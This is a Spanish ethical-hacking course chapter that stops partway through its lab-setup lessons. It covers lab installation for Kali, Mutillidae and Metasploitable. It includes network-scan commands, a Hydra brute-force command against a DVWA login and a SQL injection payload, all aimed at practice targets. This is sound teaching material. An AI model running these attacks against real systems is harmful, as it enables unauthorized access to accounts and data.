| **Inicio**         | **atrÃ¡s 12**                                | **Siguiente 14**                                    |
| ------------------ | ------------------------------------------- | --------------------------------------------------- |
| [ğŸ ](../README.md) | [âª](./7_12_Fundamentos_de_Criptografia.md) | [â©](./7_14_Inteligencia_para_la_Ciberseguridad.md) |

---

## **Ãndice**

| Temario                                                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [859. Conceptos bÃ¡sicos sobre hacking Ã©tico](#859-conceptos-bÃ¡sicos-sobre-hacking-Ã©tico)                                                                                                         |
| [860. Vulnerabilidades](#860-vulnerabilidades)                                                                                                                                                   |
| [861. Amenazas y ataques comunes](#861-amenazas-y-ataques-comunes)                                                                                                                               |
| [862. InstalaciÃ³n del entorno de pruebas Kali Linux](#862-instalaciÃ³n-del-entorno-de-pruebas-kali-linux)                                                                                         |
| [863. InstalaciÃ³n del entorno de pruebas Mutillidae](#863-instalaciÃ³n-del-entorno-de-pruebas-mutillidae)                                                                                         |
| [864. InstalaciÃ³n del entorno de pruebas Metaesplotaible](#864-instalaciÃ³n-del-entorno-de-pruebas-metaesplotaible)                                                                               |
| [865. PrÃ¡ctica: Cross-Site-Scripting, command injection y directorio transversal](#865-prÃ¡ctica-cross-site-scripting-command-injection-y-directorio-transversal)                                 |
| [866. Fases del hacking](#866-fases-del-hacking)                                                                                                                                                 |
| [867. Tipos de hacking](#867-tipos-de-hacking)                                                                                                                                                   |
| [868. PrÃ¡ctica: Obteniendo informaciÃ³n de fuentes abiertas con OSINT Framework y Google hacking](#868-prÃ¡ctica-obteniendo-informaciÃ³n-de-fuentes-abiertas-con-osint-framework-y-google-hacking)  |
| [869. PrÃ¡ctica: Analizar un sitio web con Nikto y Spiderfoot](#869-prÃ¡ctica-analizar-un-sitio-web-con-nikto-y-spiderfoot)                                                                        |
| [870. Â¿Es necesario un hacking Ã©tico? Hacking Ã©tico como profesiÃ³n](#870-es-necesario-un-hacking-Ã©tico-hacking-Ã©tico-como-profesiÃ³n)                                                             |
| [871. Conceptos. Â¿quÃ© es y quÃ© no es pentesting?](#871-conceptos-quÃ©-es-y-quÃ©-no-es-pentesting)                                                                                                  |
| [872. Tipos de pentesting. Fase Pre-ataque](#872-tipos-de-pentesting-fase-pre-ataque)                                                                                                            |
| [873. PrÃ¡ctica: Buscando secretos en repositorios GIT](#873-prÃ¡ctica-buscando-secretos-en-repositorios-git)                                                                                      |
| [874. IntroducciÃ³n al escaneo de redes](#874-introducciÃ³n-al-escaneo-de-redes)                                                                                                                   |
| [875. PrÃ¡ctica: Escaneo de redes con Nmap](#875-prÃ¡ctica-escaneo-de-redes-con-nmap)                                                                                                              |
| [876. Fase de Ataque. Testing de aplicaciones web con Burp suite](#876-fase-de-ataque-testing-de-aplicaciones-web-con-burp-suite)                                                                |
| [877. PrÃ¡ctica: Explotando vulnerabilidades en metasploitable](#877-prÃ¡ctica-explotando-vulnerabilidades-en-metasploitable)                                                                      |
| [878. Fase Post-ataque. MetodologÃ­as](#878-fase-post-ataque-metodologÃ­as)                                                                                                                        |
| [879. GestiÃ³n de riesgos y modelado de amenazas](#879-gestiÃ³n-de-riesgos-y-modelado-de-amenazas)                                                                                                 |
| [880. PCI DSS. HIPAA. DMCA.ISO/IEC 27001](#880-pci-dss-hipaa-dmcaisoiec-27001)                                                                                                                   |
| [881. Contratos, Reglas de compromisos, ClÃ¡usula de no competencia y Acuerdo de confidencialidad](#881-contratos-reglas-de-compromisos-clÃ¡usula-de-no-competencia-y-acuerdo-de-confidencialidad) |
| [882. Convenio de Budapest. Â¿CÃ³mo vamos en AmÃ©rica latina? Salvaguarda de evidencias digitales](#882-convenio-de-budapest-cÃ³mo-vamos-en-amÃ©rica-latina-salvaguarda-de-evidencias-digitales)      |
| [883. Malware y AnÃ¡lisis estÃ¡tico de malware](#883-malware-y-anÃ¡lisis-estÃ¡tico-de-malware)                                                                                                       |
| [884. Malware y AnÃ¡lisis dinÃ¡mico de malware](#884-malware-y-anÃ¡lisis-dinÃ¡mico-de-malware)                                                                                                       |
| [885. Sniffing y CÃ³mo realizar un ataque Man in the middle automatico](#885-sniffing-y-cÃ³mo-realizar-un-ataque-man-in-the-middle-automatico)                                                     |
| [886. Sniffing y CÃ³mo realizar un ataque Man in the middle manual](#886-sniffing-y-cÃ³mo-realizar-un-ataque-man-in-the-middle-manual)                                                             |
| [887. DenegaciÃ³n de servicio. Ataque DOS con LOIC y HOIC](#887-denegaciÃ³n-de-servicio-ataque-dos-con-loic-y-hoic)                                                                                |
| [888. IngenierÃ­a social](#888-ingenierÃ­a-social)                                                                                                                                                 |
| [889. PolÃ­ticas de seguridad. Seguridad fÃ­sica y Controles de acceso](#889-polÃ­ticas-de-seguridad-seguridad-fÃ­sica-y-controles-de-acceso)                                                        |
| [890. PrÃ¡ctica: Bypass autenticaciÃ³n QR (Reto 6 SANS Holiday hack)](#890-prÃ¡ctica-bypass-autenticaciÃ³n-qr-reto-6-sans-holiday-hack)                                                              |
| [891. Copias de seguridad. Defensa en lo profundo](#891-copias-de-seguridad-defensa-en-lo-profundo)                                                                                              |
| [892. PrÃ¡ctica: instalaciÃ³n del IDS snort](#892-prÃ¡ctica-instalaciÃ³n-del-ids-snort)                                                                                                              |

# **Hacking Ã‰tico**

## **859. Conceptos bÃ¡sicos sobre hacking Ã©tico**

### ğŸ§  Â¿QuÃ© es el Hacking Ã‰tico?

El **hacking Ã©tico** es el uso legal y autorizado de tÃ©cnicas de hacking para encontrar y corregir vulnerabilidades en sistemas informÃ¡ticos, redes, aplicaciones o servidores.

Es decir, un **hacker Ã©tico** piensa como un hacker malicioso, pero trabaja con **permiso**, con el objetivo de **proteger** en lugar de atacar.

---

### âœ… Objetivos del Hacking Ã‰tico

- Proteger redes y sistemas.
- Descubrir fallos de seguridad antes que los atacantes.
- Reforzar la ciberseguridad de empresas y personas.
- Cumplir normativas de seguridad como ISO 27001, NIST, etc.

---

### ğŸ‘¨â€ğŸ’» Tipos de Hackers

| Tipo de Hacker                 | DescripciÃ³n                                                                 |
| ------------------------------ | --------------------------------------------------------------------------- |
| ğŸ§¢ White Hat (Sombrero Blanco) | Hacker Ã©tico. Usa sus conocimientos para proteger.                          |
| ğŸ§¢ Black Hat (Sombrero Negro)  | Hacker malicioso. Ataca sin permiso.                                        |
| ğŸ§¢ Grey Hat (Sombrero Gris)    | EstÃ¡ en el medio. Puede hackear sin permiso, pero no con malas intenciones. |

---

### ğŸ§° Herramientas comunes del hacking Ã©tico

| Herramienta    | FunciÃ³n                                                                       |
| -------------- | ----------------------------------------------------------------------------- |
| **Kali Linux** | Sistema operativo con herramientas preinstaladas para pruebas de penetraciÃ³n. |
| **Nmap**       | Escaneo de redes y puertos.                                                   |
| **Metasploit** | Exploits y payloads para pruebas de vulnerabilidad.                           |
| **Wireshark**  | Analiza paquetes de red.                                                      |
| **Burp Suite** | Testeo de seguridad en aplicaciones web.                                      |

---

### ğŸ–¥ï¸ Â¿CÃ³mo instalar un entorno para practicar hacking Ã©tico?

#### OpciÃ³n 1: Usar una mÃ¡quina virtual con Kali Linux

1. **Instalar VirtualBox o VMware**:

   - DescÃ¡rgalo de: [https://www.virtualbox.org](https://www.virtualbox.org)

2. **Descargar la imagen de Kali Linux**:

   - Desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

3. **Importar la mÃ¡quina virtual**:

   - Abre VirtualBox > Importa el archivo `.ova` que descargaste.

4. **Inicia Kali Linux**.

---

#### OpciÃ³n 2: Usar Kali Linux desde USB

1. Descarga **Rufus**: [https://rufus.ie](https://rufus.ie)
2. Inserta tu USB.
3. Usa Rufus para "quemar" la imagen `.iso` de Kali.
4. Reinicia tu PC y arranca desde el USB.

> ğŸ”’ **Recomendado**: Usa Kali Linux en una **mÃ¡quina virtual** para no daÃ±ar tu sistema principal.

---

### ğŸ§ª Ejemplo completo de hacking Ã©tico bÃ¡sico

#### ğŸ¯ Objetivo: Escanear una red local y encontrar quÃ© dispositivos estÃ¡n conectados.

---

#### Paso 1: Abrir Kali Linux

- Abre tu Kali Linux (ya sea en mÃ¡quina virtual o USB).

---

#### Paso 2: Descubrir tu IP y red local

```bash
ip a
```

Busca algo como:

```
inet 192.168.1.100/24
```

Tu red es `192.168.1.0/24`.

---

#### Paso 3: Escanear todos los dispositivos conectados a tu red

```bash
nmap -sn 192.168.1.0/24
```

Esto escanea los hosts activos. Resultado tÃ­pico:

```
Nmap scan report for 192.168.1.1 (Router)
Nmap scan report for 192.168.1.105 (Laptop)
Nmap scan report for 192.168.1.107 (Smartphone)
```

---

#### Paso 4: Escanear puertos de un dispositivo especÃ­fico

```bash
nmap -sV 192.168.1.105
```

Resultado:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6
80/tcp   open  http       Apache httpd 2.4.29
```

Ya sabes quÃ© servicios corren en esa mÃ¡quina.

---

#### Paso 5 (opcional): Usar Nikto para escanear vulnerabilidades en el servidor web

```bash
nikto -h http://192.168.1.105
```

---

### ğŸ§  Conclusiones del ejemplo

- Usaste **Nmap** para descubrir la red y los puertos abiertos.
- Usaste **Nikto** para buscar vulnerabilidades bÃ¡sicas.
- Todo fue hecho de forma **Ã©tica** y en una red que tÃº controlas.

---

### âš ï¸ Importante sobre la Ã©tica

Nunca hagas pruebas de hacking en redes o sistemas ajenos sin permiso. Solo practica en:

- Tu propia red.
- Laboratorios virtuales (como TryHackMe, Hack The Box).
- Ambientes controlados.

---

### ğŸ“š Recomendaciones para seguir aprendiendo

- Cursos gratuitos: [TryHackMe](https://tryhackme.com), [Hack The Box](https://hackthebox.com)
- Libros:

  - â€œHacking Ã‰tico 101â€
  - â€œThe Web Application Hackerâ€™s Handbookâ€

- Certificaciones:

  - CEH (Certified Ethical Hacker)
  - OSCP (Offensive Security Certified Professional)

---

[ğŸ”¼](#Ã­ndice)

---

## **860. Vulnerabilidades**

### ğŸ§  Â¿QuÃ© es una Vulnerabilidad?

Una **vulnerabilidad** es una **debilidad o fallo** en un sistema, software, aplicaciÃ³n o red que puede ser aprovechado por un atacante para realizar una acciÃ³n maliciosa, como robar datos, obtener acceso no autorizado, interrumpir el servicio, etc.

---

### ğŸ¯ Tipos comunes de vulnerabilidades

| Tipo                           | ExplicaciÃ³n simple                        | Ejemplo                                                 |
| ------------------------------ | ----------------------------------------- | ------------------------------------------------------- |
| **Vulnerabilidad de software** | Fallo en un programa o sistema operativo. | Windows sin parches de seguridad.                       |
| **Vulnerabilidad web**         | Fallo en sitios web o apps web.           | InyecciÃ³n SQL, XSS, etc.                                |
| **Vulnerabilidad de red**      | Mala configuraciÃ³n o puertos abiertos.    | Router sin contraseÃ±a o con Telnet activado.            |
| **Errores humanos**            | Errores de configuraciÃ³n o descuido.      | ContraseÃ±a "123456" o administrador sin cambiar claves. |

---

### ğŸ§° Herramientas para encontrar vulnerabilidades

| Herramienta                 | Â¿Para quÃ© sirve?                               |
| --------------------------- | ---------------------------------------------- |
| **Nmap**                    | Escanear redes y servicios abiertos.           |
| **Nikto**                   | Buscar vulnerabilidades en servidores web.     |
| **OWASP ZAP**               | Analizar seguridad en aplicaciones web.        |
| **Burp Suite**              | Interceptar trÃ¡fico web para encontrar fallos. |
| **OpenVAS** o **Greenbone** | Escaneo de vulnerabilidades general.           |
| **Metasploit**              | Explotar vulnerabilidades conocidas.           |

---

### ğŸ§± Â¿CÃ³mo instalar un entorno para probar vulnerabilidades?

#### âœ… Lo que necesitas:

1. **Kali Linux** como atacante.
2. **MÃ¡quina vulnerable**, por ejemplo:

   - [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)
   - [Metasploitable2](https://sourceforge.net/projects/metasploitable/)

---

#### ğŸ–¥ï¸ InstalaciÃ³n en MÃ¡quina Virtual

##### Paso 1: Instala VirtualBox o VMware

- [https://www.virtualbox.org/](https://www.virtualbox.org)

##### Paso 2: Descarga Kali Linux (atacante)

- [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

##### Paso 3: Descarga Metasploitable2 (vÃ­ctima)

- [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

##### Paso 4: Ejecuta ambas mÃ¡quinas virtuales

AsegÃºrate de que **ambas estÃ¡n en la misma red interna o adaptador puente**.

---

### ğŸ” Ejemplo completo: Encontrar vulnerabilidades en una web con Nikto

#### ğŸ¯ Objetivo: Escanear una aplicaciÃ³n web vulnerable con Nikto

---

##### Paso 1: Enciende Metasploitable2

Anota la IP con:

```bash
ifconfig
```

Resultado (por ejemplo):

```
inet addr:192.168.1.105
```

---

#### Paso 2: Enciende Kali Linux y abre terminal

Ejecuta:

```bash
nikto -h http://192.168.1.105
```

---

#### Resultado tÃ­pico:

```
+ Server: Apache/2.2.8 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /phpinfo.php: PHP info file found. This file may expose sensitive information.
+ OSVDB-3268: /icons/: Directory indexing is enabled.
```

---

#### Â¿QuÃ© significa esto?

- `phpinfo.php`: expone informaciÃ³n del servidor.
- `TRACE`: mÃ©todo inseguro activo.
- `Directory indexing`: usuarios pueden ver archivos internos.

---

#### Paso 3 (opcional): Explotar una vulnerabilidad

Por ejemplo, puedes acceder a:

```bash
http://192.168.1.105/phpinfo.php
```

Y ver toda la configuraciÃ³n del servidor (peligroso si es pÃºblico).

---

### ğŸ§  Conclusiones

- Las **vulnerabilidades** son errores que se pueden **detectar y corregir**.
- Puedes encontrarlas con herramientas como **Nikto**, **Nmap**, **Burp Suite**.
- Usar un **laboratorio virtual** como Metasploitable2 + Kali te permite **practicar sin daÃ±ar sistemas reales**.

---

### ğŸ“š Recomendaciones para seguir aprendiendo

- ğŸ”— [https://owasp.org](https://owasp.org): guÃ­a oficial sobre vulnerabilidades web.
- ğŸ“˜ Curso gratuito en [TryHackMe](https://tryhackme.com)
- ğŸ’¡ Aprender sobre CVE (Common Vulnerabilities and Exposures): [https://cve.mitre.org/](https://cve.mitre.org/)

---

[ğŸ”¼](#Ã­ndice)

---

## **861. Amenazas y ataques comunes**

### ğŸ” Â¿QuÃ© es una amenaza en ciberseguridad?

Una **amenaza** es **todo aquello que puede poner en riesgo la seguridad de un sistema**, red, aplicaciÃ³n o usuario.

> âš ï¸ **No es lo mismo que un ataque**:
>
> - **Amenaza** = posibilidad de daÃ±o.
> - **Ataque** = acciÃ³n concreta que aprovecha una vulnerabilidad.

---

### ğŸ§  Tipos de amenazas

| Tipo           | ExplicaciÃ³n sencilla                    | Ejemplo                             |
| -------------- | --------------------------------------- | ----------------------------------- |
| **Humanas**    | Errores o malas prÃ¡cticas de usuarios.  | Compartir contraseÃ±as por WhatsApp. |
| **Maliciosas** | Intenciones maliciosas de atacantes.    | Hacker intenta robar contraseÃ±as.   |
| **Naturales**  | Sucesos naturales que afectan sistemas. | Terremoto que daÃ±a un servidor.     |

---

### ğŸ› ï¸ Tipos de ataques comunes

| Ataque                         | QuÃ© hace                                  | Ejemplo sencillo                                               |
| ------------------------------ | ----------------------------------------- | -------------------------------------------------------------- |
| **Phishing**                   | EngaÃ±a al usuario para robar informaciÃ³n. | Te llega un correo falso del banco.                            |
| **Malware**                    | CÃ³digo malicioso que infecta el sistema.  | Abres un archivo adjunto infectado.                            |
| **Ransomware**                 | Secuestra archivos y pide rescate.        | Bloquea tus fotos y te pide dinero.                            |
| **DDoS**                       | Satura un servidor con muchas peticiones. | Un sitio se cae porque lo atacan con miles de accesos.         |
| **SQL Injection**              | Inserta cÃ³digo malicioso en formularios.  | El atacante roba datos desde un campo de login.                |
| **XSS (Cross-site Scripting)** | Inserta scripts en pÃ¡ginas web.           | Alguien escribe un `<script>` en un formulario y roba cookies. |
| **Brute Force**                | Prueba miles de combinaciones de claves.  | El atacante intenta acceder a una cuenta probando contraseÃ±as. |
| **Man-in-the-Middle (MITM)**   | Intercepta comunicaciÃ³n entre dos partes. | Te conectas a un Wi-Fi pÃºblico y te roban la contraseÃ±a.       |

---

### ğŸ§° Â¿CÃ³mo instalar un entorno para aprender sobre ataques?

La mejor forma es con **laboratorios virtuales controlados**.

#### âœ… OpciÃ³n segura: Usar mÃ¡quinas virtuales en tu PC

#### Necesitas:

1. **VirtualBox o VMware** (para correr mÃ¡quinas virtuales)

   - [https://www.virtualbox.org/](https://www.virtualbox.org/)

2. **Kali Linux** (para simular al atacante)

   - [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

3. **DVWA (Damn Vulnerable Web Application)** o **Metasploitable2** (para simular la vÃ­ctima)

   - [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
   - [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

4. Colocar ambas mÃ¡quinas virtuales en la **misma red interna**.

---

### ğŸ’» Ejemplo completo y prÃ¡ctico: SimulaciÃ³n de un ataque de fuerza bruta

#### ğŸ¯ Objetivo: Usar **Hydra** (en Kali) para probar acceso con mÃºltiples contraseÃ±as a una web vulnerable (**DVWA**).

---

#### Paso 1: Iniciar Kali Linux (atacante) y DVWA (vÃ­ctima)

DVWA debe estar accesible desde Kali, por ejemplo en:

```
http://192.168.1.105/dvwa/login.php
```

---

#### Paso 2: AsegÃºrate de que DVWA estÃ© en modo "LOW" de seguridad

Ve a la pÃ¡gina DVWA âœ "DVWA Security" âœ selecciona `Low`.

---

#### Paso 3: Crear un archivo con contraseÃ±as comunes

```bash
echo -e "admin\n123456\npassword\ntest\nadmin123" > passwords.txt
```

---

#### Paso 4: Usar Hydra para hacer el ataque de fuerza bruta

```bash
hydra -l admin -P passwords.txt 192.168.1.105 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

#### Resultado esperado:

```
[80][http-post-form] host: 192.168.1.105   login: admin   password: password
```

> Esto significa que encontrÃ³ una contraseÃ±a vÃ¡lida (`password`) para el usuario `admin`.

---

### ğŸ§  Â¿QuÃ© aprendiste con este ejemplo?

- Simulaste un ataque real de fuerza bruta **sin daÃ±ar a nadie**.
- Usaste herramientas reales como **Hydra** y **DVWA**.
- Entendiste cÃ³mo un atacante puede probar miles de contraseÃ±as.

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerte de estos ataques?

| Ataque        | Defensa recomendada                               |
| ------------- | ------------------------------------------------- |
| Phishing      | No hacer clic en correos sospechosos.             |
| Malware       | Usar antivirus y no abrir adjuntos desconocidos.  |
| Brute Force   | Usar contraseÃ±as fuertes y lÃ­mites de intentos.   |
| SQL Injection | Validar entradas y usar consultas preparadas.     |
| DDoS          | Usar firewalls, balanceadores y mitigadores.      |
| XSS           | Escapar y sanitizar entradas en formularios.      |
| MITM          | Usar HTTPS y evitar redes Wi-Fi pÃºblicas sin VPN. |

---

### ğŸ“š Recursos gratuitos para practicar ataques y defensas

- ğŸ”— [https://tryhackme.com](https://tryhackme.com) (guÃ­a paso a paso para principiantes)
- ğŸ”— [https://owasp.org](https://owasp.org) (proyectos de seguridad web)
- ğŸ”— [https://hackthebox.com](https://hackthebox.com) (retos tÃ©cnicos con mÃ¡quinas reales)

---

[ğŸ”¼](#Ã­ndice)

---

## **862. InstalaciÃ³n del entorno de pruebas Kali Linux**

### ğŸ§  **Â¿QuÃ© es Kali Linux?**

**Kali Linux** es un sistema operativo basado en Linux, especialmente diseÃ±ado para **hacking Ã©tico, pruebas de penetraciÃ³n y anÃ¡lisis forense**. Viene con **mÃ¡s de 600 herramientas de ciberseguridad** preinstaladas como Nmap, Metasploit, Burp Suite, Wireshark, John the Ripper, entre otras.

> ğŸ” Es una de las distribuciones mÃ¡s usadas por **hackers Ã©ticos, pentesters y expertos en ciberseguridad.**

---

### âœ… Â¿Por quÃ© usar Kali Linux para pruebas?

- Tiene herramientas profesionales listas para usar.
- Es gratuito y de cÃ³digo abierto.
- Lo puedes instalar en una mÃ¡quina virtual, USB o como sistema principal.
- Ideal para **laboratorios de prÃ¡ctica sin afectar tu sistema principal.**

---

### ğŸ› ï¸ Â¿CÃ³mo instalar Kali Linux en tu PC paso a paso?

Te mostrarÃ© la forma **mÃ¡s segura y recomendada**: **instalaciÃ³n en mÃ¡quina virtual** usando **VirtualBox**.

---

### ğŸ§° Requisitos previos

| Requisito        | Detalles                                       |
| ---------------- | ---------------------------------------------- |
| Sistema          | Windows, macOS o Linux                         |
| RAM              | MÃ­nimo 4 GB (recomendado: 8 GB)                |
| Espacio en disco | MÃ­nimo 20 GB libres                            |
| VirtualBox       | Para ejecutar Kali sin instalarlo directamente |

---

### ğŸ§± PASO 1: Instalar VirtualBox

1. Ve a: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
2. Descarga la versiÃ³n para tu sistema operativo.
3. Instala como cualquier otro programa (siguiente âœ siguiente âœ instalar).

---

### ğŸ§± PASO 2: Descargar Kali Linux

1. Ve a: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. Haz scroll hasta **â€œVirtual Machinesâ€**.
3. Elige el archivo **OVA (formato listo para VirtualBox)**.
4. DescÃ¡rgalo (pesa alrededor de 3 GB).

> Ejemplo: `kali-linux-2025.1-virtualbox-amd64.ova`

---

### ğŸ§± PASO 3: Importar Kali Linux a VirtualBox

1. Abre **VirtualBox**.
2. Ve a **Archivo âœ Importar servicio virtualizado**.
3. Selecciona el archivo `.ova` que descargaste.
4. Dale a â€œSiguienteâ€ y luego â€œImportarâ€.
5. Espera unos minutos mientras se configura.

---

### ğŸ§± PASO 4: Iniciar Kali Linux

1. Haz clic en la mÃ¡quina virtual importada.
2. Presiona **Iniciar**.
3. AparecerÃ¡ Kali Linux ya instalado y funcionando.

> ğŸ§‘â€ğŸ’» Usuario y contraseÃ±a por defecto:
>
> - Usuario: `kali`
> - ContraseÃ±a: `kali`

---

### âœ… Kali Linux ya estÃ¡ listo

Ahora puedes comenzar a usar herramientas como:

- **Nmap**: escaneo de red.
- **Burp Suite**: pruebas web.
- **Metasploit**: explotaciÃ³n de vulnerabilidades.
- **Wireshark**: anÃ¡lisis de trÃ¡fico de red.

---

### ğŸ“¦ EJEMPLO COMPLETO DE USO: Escanear dispositivos en tu red con Nmap

ğŸ¯ Objetivo: Detectar quÃ© dispositivos estÃ¡n conectados a tu red y quÃ© puertos tienen abiertos.

---

#### Paso 1: Abrir una terminal en Kali

Presiona `Ctrl + Alt + T` o haz clic en el icono de la terminal.

---

#### Paso 2: Ver tu direcciÃ³n IP y rango de red

Escribe:

```bash
ip a
```

Ejemplo de salida:

```
inet 192.168.1.100/24
```

Tu red es `192.168.1.0/24`.

---

#### Paso 3: Escanear todos los dispositivos conectados

```bash
nmap -sn 192.168.1.0/24
```

Este comando detecta todos los dispositivos activos en tu red.

---

#### Resultado esperado:

```
Nmap scan report for 192.168.1.1 (Router)
Nmap scan report for 192.168.1.101 (Laptop)
Nmap scan report for 192.168.1.105 (Smartphone)
```

---

#### Paso 4: Escanear los puertos abiertos de un dispositivo

```bash
nmap -sV 192.168.1.101
```

Ejemplo de salida:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2
80/tcp   open  http       Apache 2.4.46
```

> ğŸ” Significa que ese dispositivo tiene un servidor web (puerto 80) y SSH (puerto 22) funcionando.

---

### âœ… Conclusiones

- Instalaste Kali Linux en VirtualBox de forma **segura y aislada**.
- Usaste Nmap para hacer tu **primer anÃ¡lisis de red real**.
- EstÃ¡s listo para empezar a probar otras herramientas como **Burp Suite**, **Metasploit**, **Hydra**, etc.

---

### ğŸ“š Recursos adicionales para aprender con Kali

- ğŸŒ [https://tryhackme.com](https://tryhackme.com)
- ğŸ“˜ Curso gratuito: "Kali Linux for Beginners" (YouTube y Udemy)
- ğŸ”— [https://www.kali.org/docs/](https://www.kali.org/docs/): documentaciÃ³n oficial

---

[ğŸ”¼](#Ã­ndice)

---

## **863. InstalaciÃ³n del entorno de pruebas Mutillidae**

### ğŸ§  Â¿QuÃ© es Mutillidae?

**Mutillidae** (o _OWASP Mutillidae II_) es una **aplicaciÃ³n web vulnerable intencionalmente**, creada para que los estudiantes, testers y profesionales de ciberseguridad puedan practicar ataques reales en un entorno seguro.

Fue desarrollada por OWASP y contiene decenas de vulnerabilidades web como:

- InyecciÃ³n SQL (SQLi)
- Cross-site scripting (XSS)
- CSRF
- Subida insegura de archivos
- Inyecciones de comandos
- y muchas mÃ¡s...

> âœ… Ideal para practicar con herramientas como **Burp Suite**, **OWASP ZAP**, **SQLmap**, **Hydra**, etc.

---

### ğŸ§° Â¿QuÃ© necesito para instalar Mutillidae?

Tienes 3 formas de usar Mutillidae:

1. ğŸ§ En **Kali Linux o cualquier Linux con Apache + PHP + MySQL**
2. ğŸªŸ En Windows usando **XAMPP** (servidor web local)
3. âš™ï¸ Como **mÃ¡quina virtual preconfigurada (OWASP BWA)**

Vamos a usar la mÃ¡s flexible y educativa: **Instalarlo manualmente en Kali Linux**, que ya conoces y usas.

---

### âœ… InstalaciÃ³n de Mutillidae en Kali Linux

#### ğŸ”¹ PASO 1: Instala Apache, PHP y MariaDB (MySQL)

Abre terminal y ejecuta:

```bash
sudo apt update
sudo apt install apache2 php php-mysqli mariadb-server git -y
```

---

#### ğŸ”¹ PASO 2: Clona el repositorio oficial de Mutillidae

```bash
cd /var/www/html
sudo git clone https://github.com/webpwnized/mutillidae.git
```

Renombra la carpeta (opcional):

```bash
sudo mv mutillidae mutillidae
```

---

#### ğŸ”¹ PASO 3: Configura permisos de archivos

```bash
sudo chown -R www-data:www-data /var/www/html/mutillidae
```

---

#### ğŸ”¹ PASO 4: Inicia los servicios necesarios

```bash
sudo systemctl start apache2
sudo systemctl start mariadb
```

---

#### ğŸ”¹ PASO 5: Configura la base de datos de Mutillidae

1. Ingresa a MySQL:

```bash
sudo mysql -u root
```

2. Ejecuta lo siguiente (para crear la base de datos):

```sql
CREATE DATABASE mutillidae;
exit;
```

3. Ahora ve a tu navegador en Kali y abre:

```
http://localhost/mutillidae
```

4. VerÃ¡s la interfaz de Mutillidae. Haz clic en **"Setup/reset the DB"** para crear las tablas.

---

ğŸ‰ Â¡Listo! Ya tienes **Mutillidae instalado y funcionando**.

---

#### ğŸš¨ Usuario y contraseÃ±a

Mutillidae no tiene login por defecto, pero **las credenciales se simulan dentro del laboratorio** (puedes ver usuarios en las tablas como `accounts`).

---

### ğŸ§ª EJEMPLO COMPLETO: Ataque de InyecciÃ³n SQL (SQLi)

ğŸ¯ Objetivo: Usar **una vulnerabilidad SQL** para obtener los nombres de usuarios.

---

#### Paso 1: Accede a Mutillidae

Navega a:

```
http://localhost/mutillidae
```

En el menÃº izquierdo, busca:

```
OWASP Top 10 âœ A1 - Injection âœ SQL Injection âœ User Info
```

---

#### Paso 2: Ejecuta un ataque SQLi bÃ¡sico

En el campo "User ID", escribe:

```
1' OR '1'='1
```

Haz clic en "Submit".

---

#### Resultado esperado:

El sistema te devolverÃ¡ **todos los usuarios** en lugar de solo uno. Esto se debe a que el sistema **no valida correctamente el input** y el cÃ³digo SQL queda asÃ­:

```sql
SELECT * FROM users WHERE id='1' OR '1'='1';
```

Esto siempre es verdadero (`'1'='1'`), por lo tanto te muestra todos los registros.

---

### ğŸ§  Â¿QuÃ© aprendiste?

- CÃ³mo instalar **Mutillidae** desde cero.
- QuÃ© es una **inyecciÃ³n SQL**.
- CÃ³mo una simple entrada puede vulnerar toda la base de datos si no se valida correctamente.

---

### ğŸ›¡ï¸ Â¿CÃ³mo se defiende?

- Usando **consultas preparadas (prepared statements)**.
- Validando correctamente todos los datos que ingresan los usuarios.
- Aplicando **principios OWASP**.

---

### ğŸ“š Recursos recomendados

| Recurso           | Enlace                                                                               |
| ----------------- | ------------------------------------------------------------------------------------ |
| Mutillidae GitHub | [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae) |
| OWASP Top 10      | [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)     |
| PrÃ¡ctica guiada   | [https://tryhackme.com](https://tryhackme.com)                                       |

---

[ğŸ”¼](#Ã­ndice)

---

## **864. InstalaciÃ³n del entorno de pruebas Metaesplotaible**

### ğŸ§  Â¿QuÃ© es Metasploitable?

**Metasploitable** es una mÃ¡quina virtual vulnerable creada intencionalmente para que puedas practicar ataques con herramientas como **Metasploit**, **Nmap**, **Nikto**, **Hydra**, etc., de forma **legal y segura**.

> âš ï¸ **No es una herramienta para ataques reales**, sino un entorno controlado para que aprendas hacking Ã©tico.

La versiÃ³n mÃ¡s usada es **Metasploitable2**, desarrollada por Rapid7 (creadores de Metasploit).

---

### âœ… Â¿Por quÃ© usar Metasploitable?

- Viene con mÃºltiples servicios y vulnerabilidades abiertas.
- Perfecto para aprender inyecciones SQL, RCE (ejecuciÃ³n remota de comandos), contraseÃ±as dÃ©biles, etc.
- FÃ¡cil de integrar con Kali Linux.

---

### ğŸ§° Requisitos

| Requisito       | Detalles                                           |
| --------------- | -------------------------------------------------- |
| PC con al menos | 4 GB de RAM (recomendado 8 GB)                     |
| Espacio libre   | \~20 GB                                            |
| Programas       | VirtualBox (o VMware), Kali Linux, Metasploitable2 |

---

### âœ… InstalaciÃ³n paso a paso

#### ğŸ”¹ Paso 1: Descargar VirtualBox

1. Ve a: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
2. Descarga e instala VirtualBox segÃºn tu sistema (Windows/macOS/Linux).

---

#### ğŸ”¹ Paso 2: Descargar Kali Linux (opcional si ya lo tienes)

- PÃ¡gina oficial: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
